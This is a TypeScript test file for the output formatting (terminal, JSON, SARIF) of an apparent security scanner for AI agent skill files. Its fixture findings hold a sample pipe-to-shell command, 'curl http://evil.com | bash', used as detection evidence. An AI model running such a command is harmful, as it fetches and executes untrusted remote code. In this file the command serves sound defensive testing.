/**
 * End-to-end tests for CLI output formatting and SARIF generation.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { formatReport } from './output.js';
import type { ScanReport, Finding } from './types.js';

function makeReport(overrides: Partial<ScanReport> = {}): ScanReport {
  return {
    skill_name: 'test-skill',
    score: 0,
    risk_level: 'Clean',
    findings: [],
    breakdown: { critical_count: 0, high_count: 0, medium_count: 0, low_count: 0, info_count: 0 },
    ...overrides,
  };
}

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    rule_id: 'CE-001',
    title: 'Pipe-to-interpreter pattern detected',
    severity: 'Critical',
    description: 'Content downloaded and piped to interpreter.',
    evidence: 'curl http://evil.com | bash',
    line: 10,
    remediation: 'Download and inspect first.',
    references: [],
    ...overrides,
  };
}

// ============ Terminal Output ============

describe('Terminal Output', () => {
  it('shows skill name and score', () => {
    const output = formatReport(makeReport(), 'terminal');
    assert.ok(output.includes('test-skill'));
    assert.ok(output.includes('0/100'));
  });

  it('shows SAFE verdict for clean skill', () => {
    const output = formatReport(makeReport(), 'terminal');
    assert.ok(output.includes('SAFE'));
  });

  it('shows DO NOT INSTALL for critical risk', () => {
    const report = makeReport({
      score: 100,
      risk_level: 'Critical',
      findings: [makeFinding()],
    });
    const output = formatReport(report, 'terminal');
    assert.ok(output.includes('DO NOT INSTALL'));
    assert.ok(output.includes('CRITICAL'));
  });

  it('includes finding evidence with line number', () => {
    const report = makeReport({
      score: 30,
      risk_level: 'Medium',
      findings: [makeFinding({ line: 42, evidence: 'curl x | bash' })],
    });
    const output = formatReport(report, 'terminal');
    assert.ok(output.includes('Line 42'));
    assert.ok(output.includes('curl x | bash'));
  });

  it('shows no issues message for clean report', () => {
    const output = formatReport(makeReport(), 'terminal');
    assert.ok(output.includes('No security issues found'));
  });
});

// ============ JSON Output ============

describe('JSON Output', () => {
  it('produces valid JSON', () => {
    const json = formatReport(makeReport(), 'json');
    const parsed = JSON.parse(json);
    assert.equal(parsed.skill_name, 'test-skill');
    assert.equal(parsed.score, 0);
    assert.equal(parsed.risk_level, 'Clean');
  });

  it('includes findings in JSON', () => {
    const report = makeReport({
      score: 30,
      findings: [makeFinding()],
      breakdown: { critical_count: 1, high_count: 0, medium_count: 0, low_count: 0, info_count: 0 },
    });
    const parsed = JSON.parse(formatReport(report, 'json'));
    assert.equal(parsed.findings.length, 1);
    assert.equal(parsed.findings[0].rule_id, 'CE-001');
    assert.equal(parsed.breakdown.critical_count, 1);
  });
});

// ============ SARIF Output ============

describe('SARIF Output', () => {
  it('produces valid SARIF 2.1.0', () => {
    const sarif = JSON.parse(formatReport(makeReport({ findings: [makeFinding()] }), 'sarif'));
    assert.equal(sarif.version, '2.1.0');
    assert.ok(sarif.$schema.includes('sarif-schema'));
  });

  it('includes tool driver info', () => {
    const sarif = JSON.parse(formatReport(makeReport({ findings: [makeFinding()] }), 'sarif'));
    assert.equal(sarif.runs[0].tool.driver.name, 'AgentShield');
    assert.equal(sarif.runs[0].tool.driver.version, '0.1.0');
  });

  it('maps findings to SARIF rules', () => {
    const report = makeReport({
      findings: [
        makeFinding({ rule_id: 'CE-001', severity: 'Critical' }),
        makeFinding({ rule_id: 'DE-002', severity: 'High', title: 'Exfil endpoint' }),
      ],
    });
    const sarif = JSON.parse(formatReport(report, 'sarif'));
    const rules = sarif.runs[0].tool.driver.rules;
    assert.equal(rules.length, 2);
    assert.equal(rules[0].id, 'CE-001');
    assert.equal(rules[0].defaultConfiguration.level, 'error');
  });

  it('maps results with line locations', () => {
    const report = makeReport({
      findings: [makeFinding({ line: 15 })],
    });
    const sarif = JSON.parse(formatReport(report, 'sarif'));
    const results = sarif.runs[0].results;
    assert.equal(results.length, 1);
    assert.equal(results[0].ruleId, 'CE-001');
    assert.equal(results[0].level, 'error');
    assert.equal(results[0].locations[0].physicalLocation.region.startLine, 15);
    assert.equal(results[0].locations[0].physicalLocation.artifactLocation.uri, 'SKILL.md');
  });

  it('omits locations when line is null', () => {
    const report = makeReport({
      findings: [makeFinding({ line: null })],
    });
    const sarif = JSON.parse(formatReport(report, 'sarif'));
    const result = sarif.runs[0].results[0];
    assert.equal(result.locations, undefined);
  });

  it('maps medium/low severity to warning level', () => {
    const report = makeReport({
      findings: [makeFinding({ severity: 'Medium', rule_id: 'BP-001' })],
    });
    const sarif = JSON.parse(formatReport(report, 'sarif'));
    assert.equal(sarif.runs[0].results[0].level, 'warning');
    assert.equal(sarif.runs[0].tool.driver.rules[0].defaultConfiguration.level, 'warning');
  });

  it('produces empty results for clean skill', () => {
    const sarif = JSON.parse(formatReport(makeReport(), 'sarif'));
    assert.equal(sarif.runs[0].results.length, 0);
    assert.equal(sarif.runs[0].tool.driver.rules.length, 0);
  });
});
